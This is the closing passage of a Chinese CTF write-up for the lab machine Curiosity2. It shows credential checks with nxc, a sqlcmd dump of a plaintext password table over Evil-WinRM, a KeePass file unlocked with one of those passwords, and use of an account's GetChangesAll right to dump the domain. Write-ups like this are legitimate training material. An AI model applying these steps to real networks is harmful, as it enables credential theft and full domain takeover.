successfully!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e测试凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Curiosity2 nxc smb cons.thl -u TOOLSDB -p \u003cspan class=\"hljs-string\"\u003e'Password@123'\u003c/span\u003e\nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\\TOOLSDB:Password@123 \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eTo Msol \u0026#x26; KeePass - 2\u003c/h3\u003e\n\u003cp\u003e我们登陆上\u003ccode\u003etoolsdb\u003c/code\u003e ，并用数据库脱 \u003ccode\u003etoolsdb\u003c/code\u003e 的数据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\toolsdb\\Desktop\u003e sqlcmd -S \u003cspan class=\"hljs-string\"\u003e\"localhost\\SQLEXPRESS\"\u003c/span\u003e -Q \u003cspan class=\"hljs-string\"\u003e\"USE toolsdb;select name from sys.tables\"\u003c/span\u003e\nChanged database context to \u003cspan class=\"hljs-string\"\u003e'toolsdb'\u003c/span\u003e.\nname\n--------------------------------------------------------------------------------------------------------------------------------\n\u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e\n\n(1 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\toolsdb\\Desktop\u003e sqlcmd -S \u003cspan class=\"hljs-string\"\u003e\"localhost\\SQLEXPRESS\"\u003c/span\u003e -Q \u003cspan class=\"hljs-string\"\u003e\"USE toolsdb;select * from users\"\u003c/span\u003e\nChanged database context to \u003cspan class=\"hljs-string\"\u003e'toolsdb'\u003c/span\u003e.\n\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e          username                                           password\n----------- -------------------------------------------------- --------------------------------------------------\n          1 user_6B482050                                      433129A1!@1\n          2 user_47F7501A                                      64409A1C!@1\n          3 user_515A0C58                                      CAD616E3!@1\n          4 user_CA843BF2                                      731C60AD!@1\n          5 user_AA2B9FF8                                      8E181E5F!@1\n          6 user_F6E6A108                                      47862562!@1\n          7 user_8D56BAE8                                      425B6335!@1\n          8 user_BA9B1295                                      E4FC1AC4!@1\n          9 user_66B7DBEE                                      4EE216A3!@1\n         10 user_E75B7C23                                      4CD89A92!@1\n\n(10 rows affected)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e给了一组密码，感觉是 \u003ccode\u003eKeePass\u003c/code\u003e 文件的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e433129A1!@1\n64409A1C!@1\nCAD616E3!@1\n731C60AD!@1\n8E181E5F!@1\n47862562!@1\n425B6335!@1\nE4FC1AC4!@1\n4EE216A3!@1\n4CD89A92!@1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e最后使用\u003ccode\u003e8E181E5F!@1\u003c/code\u003e成功解密\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity2/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到用户 \u003ccode\u003eMSOL\u003c/code\u003e 用户密码 \u003ccode\u003eYRax2Ry8g2ITQ3hpRPze\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e测试凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Curiosity2 nxc smb cons.thl -u MSOL -p \u003cspan class=\"hljs-string\"\u003e'YRax2Ry8g2ITQ3hpRPze'\u003c/span\u003e\nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\\MSOL:YRax2Ry8g2ITQ3hpRPze \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003eTo Administrator\u003c/h3\u003e\n\u003cp\u003e查看权限，oiiaioiiiai\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity2/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们对域有\u003ccode\u003eGetChangeAll\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e直接\u003ccode\u003eDump\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity2/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e读取 \u003ccode\u003euser.txt\u003c/code\u003e 和 \u003ccode\u003eroot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\appolonia\\Documents\u003e \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e User.flag.txt\nde4xxxxxxxxxxxxxxxxxxxx\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e root.flag.txt\n372xxxxxxxxxxxxxxxxxxxx\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e没有卡点，酣畅淋漓，一把梭哈\u003c/p\u003e\n\u003cp\u003e现在就\u003ccode\u003eCuriosity3\u003c/code\u003e把我卡住了\u003c/p\u003e","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","updated":"2025-07-19","tags":["TheHackersLabs","Windows","AD","Responder","MSSQL","gMSA","KeePass"],"categories":"靶机","comments":true,"description":"Curiosity2\n\n https://labs.thehackerslabs.com/machine/103\n \n\n\n\nRecon\n\nPortScan\n\n`nmap` 端口扫描\n\n\n\n\n\n枚举测试\n\n测试 `SMB` 匿名账户\n\n\n\n再看一眼 `wireshark` ，依旧有 `LLMNR`包，并且从数据包可以看出来是在查询 `SQLserver`\n\n\n\nResponder\n\n我们开启 `Re..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"TheHackersLabsCuriosity2"},"buildId":"nq5t09qnH8ePVEpcyZyT3","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>